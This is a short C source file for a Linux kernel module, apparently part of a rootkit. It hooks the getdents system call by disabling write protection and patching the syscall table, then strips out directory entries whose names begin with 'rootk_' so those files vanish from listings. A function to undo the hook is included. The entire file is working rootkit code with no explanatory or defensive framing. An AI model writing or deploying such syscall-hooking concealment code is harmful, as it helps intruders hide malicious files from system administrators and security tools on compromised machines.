#include <linux/mm.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/string.h>

#include "sysmap.h"
#include "file_hiding.h"
#include "hooking.h"

struct linux_dirent {
	long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};

static int (*orig_sys_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
	int bpos, nread;
	struct linux_dirent * dp;
	nread = orig_sys_getdents(fd, dirp, count);
	for(bpos = 0; bpos < nread ;){
			dp = (struct linux_dirent *) ((void*)dirp + bpos);
			if(strncmp(dp->d_name, "rootk_",6) == 0){
				nread = nread - dp->d_reclen;
				memcpy((void*)dp, (void*)dp+dp->d_reclen, nread-bpos);
				continue;
			}
			else{
				bpos += dp->d_reclen;
			}
	}
	return nread;
}

void hide_files(){
	disable_wp();
	orig_sys_getdents = syscall_table[__NR_getdents];
	syscall_table[__NR_getdents] = my_getdents;
	enable_wp();
}

void unhide_files(){
	disable_wp();
	syscall_table[__NR_getdents] = orig_sys_getdents;
	enable_wp();
}	
